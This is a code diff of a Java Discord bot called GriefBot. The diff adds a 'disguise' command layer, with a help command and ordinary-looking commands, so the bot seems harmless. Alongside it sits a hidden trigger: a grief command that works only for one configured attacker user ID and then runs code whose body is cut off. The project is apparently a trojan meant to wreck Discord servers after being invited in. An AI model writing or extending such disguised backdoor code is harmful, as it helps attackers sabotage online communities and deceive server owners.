@@ -1,6 +1,6 @@
 package de.corruptedbytes;
 
-import de.corruptedbytes.utils.Utils;
+import de.corruptedbytes.disguise.commands.HelpManager;
 import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.ChannelType;
 import net.dv8tion.jda.api.entities.Guild;
@@ -13,10 +13,10 @@ import net.dv8tion.jda.api.hooks.ListenerAdapter;
 public class GriefBotListener extends ListenerAdapter {
 
 	@Override
-	public void onReady(ReadyEvent e) {
-		Utils.sendInfo();
+	public void onReady(ReadyEvent event) {
+		GriefBotLogger.log("[GriefBot/Discord-Bot] Discord Bot started!");
 	}
-
+	
 	@Override
 	public void onMessageReceived(MessageReceivedEvent e) {
 		if (e.isFromType(ChannelType.TEXT)) {
@@ -24,6 +24,16 @@ public class GriefBotListener extends ListenerAdapter {
 			Guild guild = e.getGuild();
 			User user = e.getMessage().getAuthor();
 
+			if (message.getContentDisplay().startsWith(GriefBot.getInstance().getDisguiseCommandPrefix())) {
+				String command = message.getContentDisplay().substring(GriefBot.getInstance().getDisguiseCommandPrefix().length());
+				
+				if (command.equalsIgnoreCase("help")) {
+					HelpManager.getHelp(message.getChannel()).queue();
+				} else {
+					GriefBot.getInstance().getCommandManager().callCommand(command, message, user, guild);
+				}
+			}
+			
 			if (message.getContentDisplay().equalsIgnoreCase(GriefBot.getInstance().getGriefCommand())
 					&& user.getId().startsWith(GriefBot.getInstance().getGrieferUserID())) {
 				try {
